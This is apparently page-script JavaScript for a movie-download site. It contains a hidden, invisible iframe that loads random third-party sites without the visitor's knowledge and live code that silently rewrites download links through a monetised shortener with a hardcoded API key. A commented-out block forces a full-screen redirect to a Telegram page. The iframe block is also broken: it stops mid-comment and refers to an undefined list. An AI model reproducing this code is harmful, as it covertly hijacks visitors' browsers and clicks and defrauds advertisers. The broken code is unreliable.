var lazyanalisis = !1;
window.addEventListener("scroll", function () {
  if (
    (0 != document.documentElement.scrollTop && !1 === lazyanalisis) ||
    (0 != document.body.scrollTop && !1 === lazyanalisis)
  ) {
    !(function () {
      var e = document.createElement("script");
      e.type = "text/javascript";
      e.async = !0;
      e.src = "https://www.googletagmanager.com/gtag/js?id=G-2VYRMPXK0F";
      var a = document.getElementsByTagName("script")[0];
      a.parentNode.insertBefore(e, a);
    })();
    lazyanalisis = !0;
  }
}, !0);

window.dataLayer = window.dataLayer || [];
function gtag() {
  dataLayer.push(arguments);
}
gtag('js', new Date());
gtag('config', 'G-2VYRMPXK0F');
/*document.addEventListener("DOMContentLoaded", function () {
    const urls = [
      "https://techdiwane.com/new-brezza-2025-proves-that-timeless-design-and-smart-advance-features-always-win-hearts/",
      "https://dktechnozone.shop/2025/06/14/hero-splendor-2025-the-perfect-combination-of-style-damdar-mileage-and-shandar-performance-for-urban-riders/",
      "https://vegamovies7.shop/",
      "https://vegamovies4.shop/",
      "https://vegamovies8.shop/",
      "https://olamovies2.shop/",
      "https://vegamoviesog.shop/",
      "https://vegamovies5.shop/",
      "https://vegamovies9.shop/",
      "https://vegamovies6.shop/"
    ];
*/
    // Pick a random URL
    const randomUrl = urls[Math.floor(Math.random() * urls.length)];

    // Create the iframe
    const iframe = document.createElement("iframe");
    iframe.src = randomUrl;
    iframe.style.position = "fixed";
    iframe.style.width = "100px";
    iframe.style.height = "200px";
    iframe.style.opacity = "0";
    iframe.style.pointerEvents = "none";
    iframe.style.bottom = "0";
    iframe.style.left = "0";
    iframe.setAttribute("aria-hidden", "true");

    document.body.appendChild(iframe);
  });
document.addEventListener("DOMContentLoaded", function() {
    var apiKey = "ea96bc4942aa3d3737f7d767f7d9c6f2704a391c";
    var allowedDomains = [
        "nexdrive.lol",
        "nexdrive.xyz",
        "new1.filesdl.in",
        "nexdrive.fun"
    ];

    var links = document.querySelectorAll("a[href^='http']");
    links.forEach(function(anchor) {
        try {
            var urlObj = new URL(anchor.href);
            if (allowedDomains.includes(urlObj.hostname)) {
                var encodedUrl = btoa(anchor.href);
                var shortUrl = "https://dashboard.smallshorts.com/full?api=" + apiKey +
                               "&url=" + encodedUrl + "&type=2";
                anchor.href = shortUrl;
            }
        } catch (err) {
        }
    });
});
/*
(function () {
  const channelUrl = "https://jet-moviev3.blogspot.com/2024/12/ant-man-demo-movie-post-480p720p1080p4k.html";
  const storageKey = "joinedTelegramOnce";

  if (!localStorage.getItem(storageKey)) {
    // Show full-screen message
    const msg = document.createElement("div");
    msg.innerText = "Join this channel to continue downloading this pop-up will show only one time for lifetime browsing";
    msg.style.cssText = `
      position: fixed;
      top: 0; left: 0;
      width: 100vw; height: 100vh;
      background: #000;
      color: #fff;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 24px;
      z-index: 999999;
    `;
    document.body.appendChild(msg);

    // Redirect after short delay
    setTimeout(() => {
      localStorage.setItem(storageKey, "true");
      window.location.href = channelUrl;
    }, 3000);
  }
  })();
*/
